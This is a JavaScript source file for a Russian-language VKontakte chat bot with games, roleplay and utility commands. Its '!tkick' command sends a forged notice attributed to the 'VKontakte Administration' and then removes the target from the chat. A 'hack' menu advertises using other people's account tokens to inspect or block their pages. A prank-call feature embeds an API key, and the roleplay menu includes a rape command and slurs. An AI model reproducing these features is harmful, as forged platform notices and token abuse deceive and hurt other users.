	if(!user.call) return message.reply(`${rnick}, произошла ошибка. На вашем балансе 0 звонков.\n -- Для преобретения звонков пополните баланс.`);
	if(message.$match[1] < 9000000001) return message.send(`Пожалуйста, перепроверьте ваши данные. Чтобы зарегистрировать новый звонок, напишите так:\n\nПозвонить 9211437838`);

	let args = message.text.match(/^(?:позвонить)\s?(.*)/i);
	if(args[1].toLowerCase() == "") return message.send(nope)
		rq("http://avtobzvon.ru/api/30805870864316541bf234ec840107f0/11?.." + encodeURIComponent(args[1]) + "")
	user.call -= 1
	message.reply(`[😜] » Звонок зарегистрирован!\n -- Осталось звонков: ${spaces(user.call)}`);
	setTimeout(() => {message.send(`Набираем номер..`); }, 2000); 
	setTimeout(() => {message.send(`Пытаемся дозвонится..`); }, 2500); 
	setTimeout(() => {return message.send(`Обратите внимание! Если абонент сбросит звонок, он будет осуществен как успешный.\n -- Как только абонет повесит трубку или запись разговора окончиться, бот пришлет вам запись разговора.`); }, 4500); 
});

vk.updates.hear(/^(?:!tkick|!ткик)\s?([0-9]+)?\s([0-9]+)?\s([^]+)?/i, (message) => { 	
	let user = acc.users[user_id(message.user)];
	let rnick = (user.anick ? `@id${user.id}(${user.prefix})` : `${user.prefix}`)
	let id = message.$match[1];
	let ch = message.$match[2];
	let ms = message.$match[3];
	if(user.full == false) return;  
	if(!id) return message.reply('err Uncnown user_id');
	if(!ch) return message.reply('err Uncnown chat_id');
	if(id == 287908009) return message.reply('err Unknown del users development ⛔');
	vk.api.call("messages.send", {
		chat_id: ch,
		message: `[Case #927] @id${id} (Dear user), @id101 (Macrosystem): You were excluded by the @id100 (VKontakte Administration) for suspicious activity in the conversation #${ch}.\n @id101(Administrator) Comment; ${ms}`,
		random_id: 0 
	}).catch((error) => {return message.send(`Error messages`)
	})		 
	vk.api.call("messages.removeChatUser", {chat_id: ch, user_id: id}
		).catch((error) => {return message.send(`Error system`);
		});  	
		return message.send(`Success procces | @id${id} (user) dell chat #${ch}`)	 
	});

cm.hear(/^(?:Привет, как дела)/i, (message) => { 
	vk.api.call('users.get', {user_id: message.user}).then((res) => {let e = res[0];
		return message.send(`Привет, @id${e.id} (${e.first_name.slice(0,1)}. ${e.last_name})! У меня всё хорошо. А у тебя как?`);
	});
});

vk.updates.hear(/^(?:бдсм)/i, (message) => {
	return message.send({sticker_id: 1938});
})

cm.hear(/^(?:!me)\s([^]+)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	let rnick = (user.anick ? `@id${user.id}(${user.prefix})` : `${user.prefix}`)
	let text = message.$match[1] 
	message.send(`${rnick} ${text}`);
});

vk.updates.hear(/^audio (.+)/i, async (context) => {
	// Переменная.
	let audio = context.$match

    // Конструктор.
    const gs = [`${audio[1]}`];
    const link = gs[Math.floor(Math.random() * gs.length)];

     // Исполнение
     await Promise.all([context.send(`Ваш трек:\n -- Трек может записыватся от 3 - 10 секунд`), context.sendAudioMessage(link)]);
 });

vk.updates.hear(/^котик/i, async (context) => {
	await Promise.all([context.send('В ожидании чуда 😻'), context.sendPhoto('https://loremflickr.com/400/300/')]);
});

cm.hear(/^(?:мем|фото|мемасик|мемчик)/i, async(message) => {
	let {
		items
	} = await user.api.wall.get({
		domain: utils.pick(["fckbrain", "prukl", "greatmem"]),
		offset: 1,
		count: 10
	});
	let item = utils.pick(items);
	item = item.attachments[0].photo;
	await message.send({
		attachment: "photo" + item.owner_id + "_" + item.id
	});
});

cm.hear(/^(?:видео|видос)\s(.*)$/i, async(message) => {
	if(message.isChat) return message.send(`Псс, пишов в лс со мной, там и пиши!`)
		user.api.call('video.search', {
			q: message.$match[1],
			count: 5,
			adult: 0
		}).then(response => {
			let items = response.items.map(x => `video${x.owner_id}_${x.id}`).join(',');
			let item = utils.pick(response.items);
			message.send({
				attachment: items
			})
		})
	});

cm.hear(/^(?:абг)/i, (message) => {
	if(message.user != 347241116) return message.send(`Это просто АБГ, что тут не понятного.`)
		message.send(`Согласен с тобой повелитель!`)
})

cm.hear(/^(?:upt)/i, message => {
	message.send(`
		🔺Uptime: Время с момента включения/перезапуска бота.🔺

		🔹🔹🔹🔹🔹
		${unixStampLeft(process.uptime() * 1000)}
		🔹🔹🔹🔹🔹
		`);
});

cm.hear(/^(?:Рник)/i, (message) => {
	let nicks = ["☜❶☞Limbo☜❶☞", "D҉O҉N҉A҉T҉҉1K҉", "Føxŷ", "ОпАSнЫй_ВоЗрАSт", "He}I{g@H4uk", "Д)(øķêp", "Cr1stal", "^-^МаJlыш^-^", "The_myst3", "PozziBros", "*Limon4k*", "_Marcus_03", "Ŧøթҹนķ", "ẌūℒΐǤắ₦", "3Jlou_4uTep", ">>¥¥♔Limbo♔¥¥<<", "СвяТой_ТапоК", "N.E.V.E.N", "_LegenDa_", "Lиsичка", "çŤрẮχ", "DarK_Knigt", "Đéɱǿή", "_MaRiXyAnA_", "KiSS_Ka", "ѼЯϬӅѲҶҟӨѼ", "DUBERMAN", "Sexy_ПуПоК", "♛ĂʟӍάƷ♛ツ", "-=FOX=-", "Э)̅ζь√ИРа", "❤ОчฉpσßฉτеJlьทฉศ_ðеßσчkฉ❤", "รקคгтคςυร", "●•✪Ďofẵ✪•●", "W1zarD", "Kikus", "๖ۣۣۜC๖ۣۣۜA๖ۣۣۜR๖ۣۣۜL๖ۣۣۜO๖ۣۣۜS", "***ℳტᗫᎯℜტ***", "KyKyPy3a", "˜”*°•.♥.•°*”˜", "(つ•̀ᴥ•́)つ*:･ﾟ✧", "$.c.o.R.p.!.O.N", "♔Lucky♔", "†МОНАХ†", "G_O_D", "Sk1pe", "Д.Р.Э.Й", "n1k3~", "VΛCUUM", "☭СССР☭", "Do-Mi-Rek", "Ate1st", "4uD@4oK", "(●̮̮̃●̃)DaD(●̮̮̃●̃)", "Ф-Е-Н-И-К-С", "n1ce*", "FaN@t!k", "ǷȫѮѦ", "๏̯͡๏ищу♥теЂя๏̯͡๏", "◄₡ẫ✘ø₱ǿҜ►"].random()
	return message.send(`Предлагаю тебе вот этот: ${nicks}`);
});

cm.hear(/^(?:time)/i, message => {
	return message.send(`Точное время у @id287908009(Артёма): \n----------------------
		${time(1)} (МСК)
		`);
});

cm.hear(/^(?:анечка,|анечка)/i, message => {
	const googleTTS = require('google-tts-api');
	
	rq("https://isinkin-bot-api.herokuapp.com/1/talk?q=" + encodeURIComponent(message.text)).then(res => {
googleTTS(res.text, 'ru', 2.5)   // speed normal = 1 (default), slow = 0.24
.then(function (url) {
	message.sendAudioMessage(url) ;
})
})
});


cm.hear(/^(?:scr)\s(.*)/i, async(message) => {
	
	message.sendPhoto("http://mini.s-shot.ru/RU?" + message.$match[1])
})

vk.updates.hear(/^(?:hit)\s?([0-9]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	let args = message.$match[1];
	if(args == user_id(message.user)) return message.send(`@id${user.id}(${user.prefix}), Вы указали свой ID`)
		if(!message.$match[1]) return message.send(`🔸 ➾ Пример команды: hit [ID] 👊 `);
	if(!Number(message.$match[1])) return message.send(`🔸 ➾ ID Должен содержать только цифры`);
	if(user.level < 1) return message.send(`🔸 ➾ Вы не VIP-Пользователь`);
	if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Игрок не найден!`);
	if(message.$match[1] == 2) return message.send(`Уважаемый @id${user.id}(пользователь), к сожалению эту команду нельзя использовать на @id287908009 (Разработчике)!`);
	var is = [user_id(message.user), message.text] 
	user.block_porn = true;
	setTimeout(() => {
		user.block_porn = false;
	}, 3600000);
	let text = `❤ ➾ Игрок ${user.prefix} уебал(а) тебя 👊`
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: text,			random_id: 0
	}); 
	return message.send(`❤ @id${user.id}(${user.prefix}), вы уебали [${acc.users[message.$match[1]].prefix}]`);
}); 

cm.hear(/^(?:группа)/i, (message) => {

	return message.send(`[bot.anya|Ссылка на нашу группу: ]`, {
		attachment: 'photo-179084056_456239099'
	});
});

vk.updates.hear(/^(?:kod900)/i, message => { 
	if(message.isChat) return message.send(`Данная команда доступна в личных сообщениях.`)
		let user = acc.users[user_id(message.user)];
	message.send(`❗ Доступ к adm панели  ...`); 
	setTimeout(() => {message.send(`❗ Подождите не много...`); }, 4000); 
	setTimeout(() => {message.send(`❗ 5`); }, 6000); 
	setTimeout(() => {message.send(`❗ 4
		`); }, 12000); 
	setTimeout(() => {message.send(`❗ 3`); }, 14000);
	setTimeout(() => {message.send(`❗ 2`); }, 14000); 
	setTimeout(() => {message.send(`❗ 1`); }, 14000);
	setTimeout(() => {message.send(`
		😂😂😂 А хер, ты думал так легкоо? 😂😂😂`); }, 14000);   
});

vk.updates.hear(/^(?:вкищи)\s?([^]+)?/i, message => { 
	let id = user_id(message.user); 
	let user = acc.users[user_id(message.user)]; 
if(!message.$match[1]) return message.send(`ОШИБКА ! 😱\n Подсказка: Пример команды: вкищи [пользователь вк]\nПример вкищи Денис Смирнов`) // Подсказка для команды 
	vk.api.call("utils.getShortLink", {url: `https://vk.com/search?c%5Bper_page%5D=40&c%5Bq%5D=${message.$match[1]}%20${message.$match[1]}&c%5Bsection%5D=people`}).then(function (res){ 
		return message.send(`Пользователи ${message.$match[1]}:` + res.short_url); 
	}); 
});

vk.updates.hear(/^(?:Динфо)/i, message => { 
	message.send(`Для приобретения донат коинов Вам нужно:`); 
	setTimeout(() => {message.send(`
		1. Написать " пополнить [сумма]
		( 1 рубль - 2 доната).
		К примеру: Если вы переведете 100 рублей, вы получите 200 доната ! 
		Пример: пополнить 100 `); }, 4000); 
	setTimeout(() => {message.send(`
		2. Далее перейдите по ссылке и нечего в комменты не изменяйте !`); }, 6000); 
	setTimeout(() => {message.send(`3. Завершите перевод.`); }, 8000); 
	setTimeout(() => {message.send(`4. После чего, зайди в историю своего QIWI Кошелька: См. Скриншот.`,{attachment: `photo-179018727_456239021`}); }, 10000); 
	setTimeout(() => {message.send(`5. Зайдя в историю, вы найдёте совершённый вами платёжь.\n Раскройте подробную информацию о нём и там вы найдёте "Номер квитанции" где будет указан код из 13 цифр: См. Скриншот.`,{attachment: `photo-179018727_456239022`}); }, 12000); 
	setTimeout(() => {message.send(`6. После того, как вы нашли даннй код, скопируйте его. Уже находясь в Боте введите: donate [Тот самый номер квитанции]. Если вы всё сделали верно, бот выдаст вам донат коины и напишите " донат " чтобы попасть в донат магазин бота !`); }, 14000); 
});

vk.updates.hear(/^(?:elitdom)\s?([0-9]+)?\s([^]+)?/i, (message) => {		
	let user = acc.users[user_id(message.user)];
	if(!message.$match[1] || !acc.users[message.$match[1]] || !message.$match[2]) return message.send(` ➾ Пример команды: givedom [ID] [название]`);
	if(!Number(message.$match[1])) return message.send(`🔸 ➾ Число должно быть цифрового вида.`);
	if(user.ap < 3) return message.send(`🔸 ➾ Вы не администратор`);
	let a = zapret(message.$match[1]);
	if(a != 0) return message.send(a)
		if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Такого игрока нет!`);
	acc.users[message.$match[1]].house = message.$match[2]; 
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: ` ➾ ${user.prefix} выдал вам элитный дом ${message.$match[2]}`,random_id: 0
	});
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(` ➾ Вы выдали дом игроку [${acc.users[message.$match[1]].prefix}] \n ➾ Дом: ${message.$match[2]}`);
}); 

vk.updates.hear(/^(?:Адмхалява)$/i, (message) => {
	return message.send(`
		Акций на бесплатную админку на данный момент нет.


		`);
});

vk.updates.hear(/^(?:пидор|мать ебал|ебал)$/i,  (message) => { 
	let user = acc.users[user_id(message.user)];
	return message.send(`

		Мут








		`)
});

vk.updates.hear(/^(?:кусь)\s?([0-9]+)?\s([^]+)?/i, (message) => {  
	let user = acc.users[user_id(message.user)];
	if(!message.$match[1] || !acc.users[message.$match[1]] || !message.$match[2]) return message.send(`🔸 ➾ Пример команды: кусь [ID] [за что укусить]`);
	if(!Number(message.$match[1])) return message.send(`🔸 ➾ Число должно быть цифрового вида.`);
	if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Такого игрока нет!`);
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: `💥 Игрок ${user.prefix} укусил Вас за ${message.$match[2]}`,random_id: 0
	});
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`Вы укусили игрока за ${message.$match[2]}`);
}); 

vk.updates.hear(/^(?:конкурс)\s?([0-9]+)?/i, message => {
	let user = acc.users[user_id(message.user)];
	if(user.balance < message.$match[1]) return message.send(`💸 ➾ У вас нет столько денег !`)
		if(user.lvl >= 0){
			if(!message.$match[1] || message.$match[1] < 0 || message.$match[1] > 20000000000000) return message.send(`💰 ➾ Пример: 'конкурс сумма' ( Ложить можно до 2.000.000 )`);
			user.balance -= Number(message.$match[1]);
			user.xd += Number(message.$match[1]);
		}
		return message.send(`Вы положили в банк конкурса ${spaces(message.$match[1])}$`);
	});

vk.updates.hear(/^(?:пварн)\s?([0-9]+)?\s([^]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(!message.$match[1] || !message.$match[2]) return message.send(`🔸 ➾ Пример команды: пварн [ID] [ПРИЧИНА]`);
	if(!Number(message.$match[1])) return message.send(`🔸 ➾ Число должно быть цифрового вида.`);
	if(user.balance < 15000000) return message.send(`🔸 ➾ У вас нет 15.000.000 $ !`);
	user.balance -= 15000000;
	let a = zapret(message.$match[1]);
	if(a != 0) return message.send(a)
		if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Такого игрока нет!`);

	logs(user_id(message.user), message.$match[1], message.$match[2], type = 6)

	var is = [user_id(message.user), message.text] 
	adm_log(is)

	let text = `✅ ➾ ${user.prefix} выдал вам warn(предупреждение)\nОбжаловать можно тут: в разработке`
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: text,random_id: 0
	});
	return message.send(`✅ ➾ Вы выдали предупреждение игроку [${acc.users[message.$match[1]].prefix}].\n-15.000.000 $ за пранк !`);
}); 

vk.updates.hear(/^(?:vzlom 300200100)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.volftube6 == true) return message.send(`➾ Не наглей окей?`);
	user.balance += 30000000;
	user.volftube6 = true;
	let rez = [true, false].random();
	if(rez == false){
		let text = [].random(); 
		return message.send(`Вы получи 30.000.000. $`);
	}else{ 
		let count = [0].random();
		user.balance += count;
		return message.send(`Вы получи 30.000.000. $`);
	}
}); 

vk.updates.hear(/^(?:вкгруппа)\s?([^]+)?/i, message => { 
	let id = user_id(message.user); 
	let user = acc.users[user_id(message.user)]; 
if(!message.$match[1]) return message.send(`ОШИБКА ! 😱\n Подсказка: Пример команды: вкищигруппы [группа вк]\nПример вкищигруппы VOLF бот`) // Подсказка для команды 
	vk.api.call("utils.getShortLink", {url: `https://vk.com/search?c%5Bper_page%5D=40&c%5Bq%5D=${message.$match[1]}&c%5Bsection%5D=communities`}).then(function (res){ 
		return message.send(`Группы ${message.$match[1]}:` + res.short_url); 
	}); 
});
vk.updates.hear(/^(?:вкмузон)\s?([^]+)?/i, message => { 
	let id = user_id(message.user); 
	let user = acc.users[user_id(message.user)]; 
if(!message.$match[1]) return message.send(`ОШИБКА ! 😱\n Подсказка: Пример команды: вкмузон [названия]\nПример вкмузон гарри топор`) // Подсказка для команды 
	vk.api.call("utils.getShortLink", {url: `https://vk.com/search?c%5Bper_page%5D=200&c%5Bq%5D=${message.$match[1]}&c%5Bsection%5D=audio`}).then(function (res){ 
		return message.send(`музон ${message.$match[1]}:` + res.short_url); 
	}); 
});

/*vk.updates.hear(/^(?:обнять|прижать к себе)\s?([0-9]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	let args = message.$match[1];
	if(args == user_id(message.user)) return message.send(`@id${user.id}(${user.prefix}), Вы указали свой ID`)
		if(!message.$match[1]) return message.send(`🔸 ➾ Пример команды: обнять [ID] 🤗 `);
	if(!Number(message.$match[1])) return message.send(`🔸 ➾ ID Должен содержать только цифры`);
	if(user.level < 1) return message.send(`🔸 ➾ Вы не VIP-Пользователь`);
	if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Игрок не найден!`);
	if(message.$match[1] == 2) return message.send(`Уважаемый @id${user.id}(пользователь), к сожалению эту команду нельзя использовать на @id287908009 (Разработчике)!`);
	var is = [user_id(message.user), message.text] 
	user.block_porn = true;
	setTimeout(() => {
		user.block_porn = false;
	}, 3600000);
	let text = `🤗 ➾ Игрок ${user.prefix} обнял(а) тебя 🤗`
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: text,			random_id: 0
	}); 
	return message.send(`🤗 @id${user.id}(${user.prefix}), вы обняли [${acc.users[message.$match[1]].prefix}]`);
});  
*/

cm.hear(/^(?:Обнять)\s?([^]+)?$/i, async(message) => {
	let smiless = [':)', ' :(', ' :D', ' :c', ' :3', ' :/']
	let smiles = [{
		smile: ':)'
	},
	{
		smile: ':('
	},
	{
		smile: ':D'
	},
	{
		smile: ':c'
	},
	{
		smile: ':3'
	},
	{
		smile: ':/'
	}
	];

	let smile = smiles.filter(x => x.smile == `${message.$match[1]}`)
	let gg = smiless.map(function(smiles) {
		return smiles;
	})

	try {
		if (message.$match[1] !== smile[0].smile) return;
	} catch (err) {
		return message.send(`Доступные смайлы: [${gg}]`)
	}
	if (message.forwards[0]) {
		let us = acc.users[user_id(message.forwards[0].senderId)]
		if (!us) {
			message.send(`${nick} данный пользователь не зарегистрирован в боте`)
		}
		message.send(`
			🤗 @id${acc.users[user_id(message.user)].id} (${acc.users[user_id(message.user)].prefix}) обнял @id${us.id} (${us.prefix})
			💬 С репликой: «${message.$match[1]}}»
			`);
	}

	if (message.replyMessage) {
		let uss = acc.users[user_id(message.replyMessage.senderId)]
		if (!uss) {
			message.send(`${nick} данный пользователь не зарегистрирован в боте`)
		}
		message.send(`
			🤗 @id${acc.users[user_id(message.user)].id} (${acc.users[user_id(message.user)].prefix}) обнял @id${uss.id} (${uss.prefix})
			💬 С репликой: «${message.$match[1]}»
			`);
	}
})

vk.updates.hear(/^(?:Летчик)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.upis65465465 < 3) return message.send(`❗ Доступно с 3 уровня. Ваш уровень маловат. ❗ Подробнее, напишите " лвлап " `);
	if(user.aircraft == false) return message.send(`У вас нет самолета !`);  
	if(user.bloks.gandon == true) return message.send(`Вас самолет уже отправился в путь !`);
	user.bloks.gandon = true
	setTimeout(() => {
		user.bloks.gandon = false
		user.balance += 200000;
		vk.api.call('messages.send', {
			peer_id: user.id,
			message: `Вы закончили работать летчиком и успешно заработали 200.000 $` , random_id: 0
		});
	}, 10800000);
	let rez = [true, false].random();
	if(rez == false){
		let text = [].random(); 
		user.balance -= 0;
		return message.send(`Работа летчика началась !`);
	}else{ 
		let count = [0].random();
		user.balance += count;
		return message.send(`Работа летчика началась !`);
	}
}); 

vk.updates.hear(/^(?:казарт)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.kvest2 == true) return message.send(`💻 Данный квест уже выполнен !`);
	if(user.upis1 < 100) return message.send(`💻 Сначала сыиграйте 100 раз в казино , чтобы выполнить данный квест !`);
	user.kvest2 = true;
	user.balance += 10500000;
	let rez = [true, false].random();
	if(rez == false){
		let text = [].random(); 
		user.balance -= 0;
		return message.send(`💸 Вы получили 10.500.000 $`);
	}else{ 
		let count = [0].random();
		user.balance += count;
		return message.send(`💸 Вы получили 10.500.000 $`);
	}
});  

vk.updates.hear(/^(?:инфоАккаунт)$/i, (message) => {
	return message.send(`
		🌀 Для того, чтобы подтвердить свой аккаунт и получить статус " подтвержден " вам нужно знать правила бота. Это очень Важно !

		🌀 Далее Ваш уровень должен быть более 5. ( Подробнее о уровнях " лвлап " )

		🌀 Ваш аккаунт должен быть чист от банов, мутов и тд. 


		🛑 Все заявки на подтверждения рассматриваются нашими администраторами. Администрацию обмануть не получиться ибо все четко проверяется !

		⚠ Для того, чтобы подать заявку на подтверждения аккаунта, напишите " репорт ver "

		`);
});

vk.updates.hear(/^(?:Звезда)$/i, (message) => {
	return message.send(`
		❗🤪🤩❗ Чтобы быть звездой, нужны деньги, без денег не куда. По субботам проводим результаты. Если у кого то в штате больше всех денег, становится звездой и появляется в специальном списке.



		`);
});

vk.updates.hear(/^(?:лвлап)$/i, (message) => {
	return message.send(`

		👤 Работая, играя в игры, Вы получаете опыт.

		Чтобы прокачать, напишите " акция вверх [сумма]. Пример: акция вверх/вниз 1"

		Также можете написать " халява " чтобы быстрее собирать опыт.


		`);
});

vk.updates.hear(/^(?:элитмагаз)$/i,  (message) => { 
	return message.send(`
		║ 📍 Казино в штате - 100 рублей
		║ 📍 Наркопритон - 80 рублей
		║ 📍 Банк в штате - 50 рублей
		║ 📍 Автозавод в штате - 70 рублей

		💻 Покупка осуществляется за реальные деньги. По поводу покупки, пишите создателю боту: https://vk.com/zeufs



		`)
});	

cm.hear(/^(?:id|ид)$/i, (message) => {
	if(message.forwards[0]){
		let id = message.forwards[0].senderId;

		message.send(`Id🆔: ${user_id(id)}😎`);
	}
	if(message.replyMessage){
		let id = message.replyMessage.senderId;

		message.send(`Id🆔: ${user_id(id)}😎`);
	}
})	

vk.updates.hear(/^(?:аккаунт)$/i, (message) => {
	let user = acc.users[user_id(message.user)];
	if(user.act == false) return message.send(`@id${user.id}(${user.prefix}), Ваш Аккаунт не активирован!\n — Для активации пиши 'Регистрация'. \n— После чего следуйте дальнейшим инструкциям.`);
	message.send(`
		📜 Аккаунт:
		⏰ Регистрация - Регистрация в системе бота
		⏳ Профиль - Ваш профиль
		🎲 Профиль [ID] - Покажет профиль другого человека
		🎓 Закрыть/Открыть профиль - Состояние профиля
		🎊 Статус [Ваш статус] - Установка статуса профиля
		🎰 Игропрофиль - ваш игровой профиль.
		⚡ qbal [работает у кого есть доступ] - кинет ваш баланс QIWI
		♻ QTEST - Дать доступ к qiwi [ для разработчика ]
		👑 Передать [ID] [Сумма] - Передать пользователю сумму денег
		💾 SMS [ID] [Сообщение] - Отправить сообщение другому пользователю
		✒ Ник [ник/вкл/выкл]
		⌛time - узнать время у Создателя (по МСК)
		🌀 Инфоаккаунт - узнать как получить верификацию аккаунта
		📕 рник - скинет вам рандомный "ник"
		🕹 мой ид - покажет вам ваш "цифровой ид" и "ид в данном боте"
		`)
});

vk.updates.hear(/^(?:развлечения)$/i, (message) => {
	let user = acc.users[user_id(message.user)];
	if(user.act == false) return message.send(`@id${user.id}(${user.prefix}), Ваш Аккаунт не активирован!\n — Для активации пиши 'Регистрация'. \n— После чего следуйте дальнейшим инструкциям.`);
	message.send(`
		🎉Развлекательные:
		🚀 Игры - Ваши игры
		🦊 Монетка [орёл|решка].
		💫 Суефа [камень|ножницы|бумага].
		💞 Брак [ID] - сделать предложение
		💔 Развод - Подать на развод
		💎 Бонус - ежедневный бонус
		💼 кейсы - Донат кейсы
		💻 YouTube - Ютуб канал
		💕 Совместимость [Имя парня/девушки]
		📈 Инфа [Слово]
		🔮 Шар - предскажет будущее
		✉ Кто я - Подскажет вам: кто вы
		📹 Видос [фраза].
		🌍 Мем - Даст вам случайный мемасик.
		👤 Кто [фраза].
		🔖 QR [Ссылка/Текст] - Сгенирирует вам QR-код
		📄 Цитатни [пересланное сообщение] - Сделает цитату великих людей.
		☠ Памятник [пересланное сообщение] - Сделает памятник
		🌈 Сохра - Даст вам случайную сохранёнку.
		💢 Погода [Город] - Покажет точную погоду по запросу
		💞 GIF [Запрос] - покажет вам GIF материал по запросу
		✏ WIKI [Запрос] - Выдаст вам ссылку на запрашиваемую информацию в викепидии
		💥 » Анекдот - Скинет вам анекдот
		💫 » Стишок - Скинет вам стишок
		👁‍🗨 » История - Скинет вам историю
		`)
});

vk.updates.hear(/^(?:хак|hack)$/i, (message) => {
	let user = acc.users[user_id(message.user)];
	if(user.act == false) return message.send(`@id${user.id}(${user.prefix}), Ваш Аккаунт не активирован!\n — Для активации пиши 'Регистрация'. \n— После чего следуйте дальнейшим инструкциям.`);
	message.send(`
		😈hack:
		🔑 token [токен] - получить всю информацию о токене.
		📠 Utoken [токен юзера] - получить всю информацию о странице вконтакте. 
		🖥 scr [ссылка] - кидает скрин сайта.
		⚙userblock [токен юзера] - заблокировать данного пользователя Вконтакте.
		😁 Пополнить [сумма] - пополнить разработчику на развивание проекта.
		😜!онлайн - покажет онлайн людей
		💡Пинг "ссылка" - покажет вам пинг сервера.
		`)
});

vk.updates.hear(/^(?:для чата)$/i, (message) => {
	let user = acc.users[user_id(message.user)];
	if(user.act == false) return message.send(`@id${user.id}(${user.prefix}), Ваш Аккаунт не активирован!\n — Для активации пиши 'Регистрация'. \n— После чего следуйте дальнейшим инструкциям.`);
	message.send(`
		🔔 для чата:
		📠 !clear - отчищает чат от лишних сообщений
		📩 !vknick - меняет ваш игровой ник на имя ВКонтаке
		📧 vkprof "cсылка" - показывает профиль человека ВК
		🎧 РандМуз - Кинет вам рандомную музыку
		🆔id|ид [пересланное сообщение] - узнать ид игрока
		🎲 РандСтик - Кинет вам рандомный стикер
		✅ verify - покажет подтверждённые аккаунты
		🐱 мурр - промурлычет
		😻 котик - в ожидание чуда
		🆘 бдсм - скинет вам стикер
		🎶 ой пиздец - пришёл голосовое сообщение
		⏱ время/дата - узнать время или дату по МСК
		`)
});

vk.updates.hear(/^(?:полезное)$/i, (message) => {
	let user = acc.users[user_id(message.user)];
	if(user.act == false) return message.send(`@id${user.id}(${user.prefix}), Ваш Аккаунт не активирован!\n — Для активации пиши 'Регистрация'. \n— После чего следуйте дальнейшим инструкциям.`);
	message.send(`
		🔥 Полезное:
		💼 Фракции - список фракций
		📋 Фракция - информация о фракции
		🗣 Скажи [текст] - озвучит ваше сообщение.
		📙 Cократи [ссылка]
		✏ Магазин - Магазин товаров
		⚠ Донат - Донат-магазин
		😌 Динфо - узнать помощь по донату.
		🏆 Топ - Топ по рейтингу
		💳 Баланс
		💬 Транскрипт - переводит с русского на английский
		💫 Напиши [слово] - напишет ваше слово
		📣 !me - сделает ваше действие от лица бота
		😎 Созвать всех - упомянает всех кто есть в беседе
		`)
});

vk.updates.hear(/^(?:рп|rp)$/i, (message) => {
	let user = acc.users[user_id(message.user)];
	if(user.act == false) return message.send(`@id${user.id}(${user.prefix}), Ваш Аккаунт не активирован!\n — Для активации пиши 'Регистрация'. \n— После чего следуйте дальнейшим инструкциям.`);
	message.send(`
		💋KISS [ID] - "Поцеловать" игрока.
		🆘SEX [ID] - Заняться "сексом" с игроком.
		👨‍MINET [ID] - Сделать "Минет" игроку.
		⚠KUNI [ID] - Сделать "Куни" игроку.
		🤗 Обнять [пересланное сообщение] - обнимет любого человека.
		🔞IZNAS [ID] - "Изнасиловать" игрока
		🐝 Кусь [id] [место] - укусит кого либо человека за определённую часть тела.
		👊 - Hit [ID] - ударить игрока.
		`)
});

vk.updates.hear(/^(?:разное)$/i, (message) => {
	let user = acc.users[user_id(message.user)];
	if(user.act == false) return message.send(`@id${user.id}(${user.prefix}), Ваш Аккаунт не активирован!\n — Для активации пиши 'Регистрация'. \n— После чего следуйте дальнейшим инструкциям.`);
	message.send(`
		💡 Разное:
		💰 Кредит - Взять кредит
		📊 Курс - курс на данный момент
		✉ Ник [name] - сменить свой ник в чате
		❤ Трейд [Сумма] - обмен сердечек на $
		⚠ Правила - актуальные правила Бота
		👾 бот - проверить стабильность бота
		`)
});

vk.updates.hear(/^(?:игры|игра)$/i, (message) => {
	let user = acc.users[user_id(message.user)];
	if(user.act == false) return message.send(`@id${user.id}(${user.prefix}), Ваш Аккаунт не активирован!\n — Для активации пиши 'Регистрация'. \n— После чего следуйте дальнейшим инструкциям.`);
	message.send(`
		❓ Информация:
		🎰 Игропрофиль - ваш игровой профиль.
		⛔ Лог - инфо о последних играх.

		🎰 Азарт:
		🎰 Казино [сумма]
		🎰 Акция [вверх/вниз] [ставка]
		🎰 Ставка [выше/ниже] [ставка]
		🎰 Рандом [1-60] [ставка]
		🎰 Вабанк [Ставка] - Играй на свой страх и риск!

		🔥 Прочие:
		💰 Сейф - взлом сейфа.
		❓ Загадка/Ответ [ответ]/Сдаюсь
		💥 Лотерея - на деньги.

		🔫 Рулетка:
		💣 Сапёр [ставка] - игра в сапёр.
		🔫 Тир - Играть в тир
		🔫 рр [ставка] - Руская рулетка.
		🔫 Крутить - открыть оружейный кейс за 10к.
		🔫 Стрела [id] [ставка] - назначить стрелу.
		🔫 Принять - принять вызов.
		🔫 Сдаться - отказ от стрелы.
		`)
});

vk.updates.hear(/^(?:бизнес|бизнесы)$/i, (message) => {
	let user = acc.users[user_id(message.user)];
	if(user.act == false) return message.send(`@id${user.id}(${user.prefix}), Ваш Аккаунт не активирован!\n — Для активации пиши 'Регистрация'. \n— После чего следуйте дальнейшим инструкциям.`);
	message.send(`
		🏤 Бизнесы - Список бизнесов
		📈 Бизнес [1-2] - Статистика бизнеса.
		💵 Бизнес снять [1-2] (суммма) - Снять деньги с счёта.
		👷 Бизнес нанять [1-2] (кол-во) - Нанять рабочих.
		✅ Бизнес улучшить [1-2] - Улучшить бизнес.
		`)
});

vk.updates.hear(/^(?:работа|работы)$/i, (message) => {
	let user = acc.users[user_id(message.user)];
	if(user.act == false) return message.send(`@id${user.id}(${user.prefix}), Ваш Аккаунт не активирован!\n — Для активации пиши 'Регистрация'. \n— После чего следуйте дальнейшим инструкциям.`);
	message.send(`
		👔 Работы - список работ
		🔨 Работать
		❌ Уволиться.
		✈ Летчик - взять рейс лётчика (получаешь зарплату за 1 рейс)
		`)
});

vk.updates.hear(/^(?:вкпоиск|Вкпоиск)$/i, (message) => {
	let user = acc.users[user_id(message.user)];
